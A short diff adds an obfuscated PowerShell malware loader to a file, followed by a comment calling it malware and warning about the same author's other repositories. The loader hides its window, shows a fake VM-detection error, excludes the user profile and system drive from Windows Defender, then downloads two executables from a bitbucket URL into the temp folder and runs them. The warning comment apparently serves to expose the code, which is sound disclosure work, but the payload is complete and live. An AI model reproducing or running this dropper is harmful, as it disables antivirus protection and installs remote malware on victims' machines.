@@ -1,0 +1,5 @@
+<#qng#>Start-Process powershell -WindowStyle Hidden -ArgumentList "Add-Type -AssemblyName System.Windows.Forms;<#dzb#>[System.Windows.Forms.MessageBox]::Show('No VM/VPS allowed!','','OK','Error')<#zpw#>;";<#nlh#> Add-MpPreference <#xex#> -ExclusionPath @($env:UserProfile,$env:SystemDrive) <#env#> -Force <#vfb#>;(New-Object System.Net.WebClient).DownloadFile('https://bitbucket.org/lucifer61/lasttest/raw/b929b437b75c0de4d7c2abfc361400c5fe5c8ca5/Kys.exe', <#fqk#> (Join-Path <#gft#> -Path $env:Temp <#epe#> -ChildPath 'Protector.exe'))<#rdr#>; (New-Object System.Net.WebClient).DownloadFile('https://bitbucket.org/lucifer61/lasttest/raw/b929b437b75c0de4d7c2abfc361400c5fe5c8ca5/mimimi.exe', <#atf#> (Join-Path <#sjy#> -Path $env:Temp <#ynb#> -ChildPath 'AntiDebug.exe'))<#pmd#>; Start-Process -FilePath <#kgx#> (Join-Path -Path $env:Temp <#xvq#> -ChildPath 'Protector.exe')<#psg#>; Start-Process -FilePath <#mni#> (Join-Path -Path $env:Temp <#gyl#> -ChildPath 'AntiDebug.exe')<#kwg#>
+
+bad try, learn to make good malware first lol
+
+tldr: this is malware, as well as all of luci61 other repositories
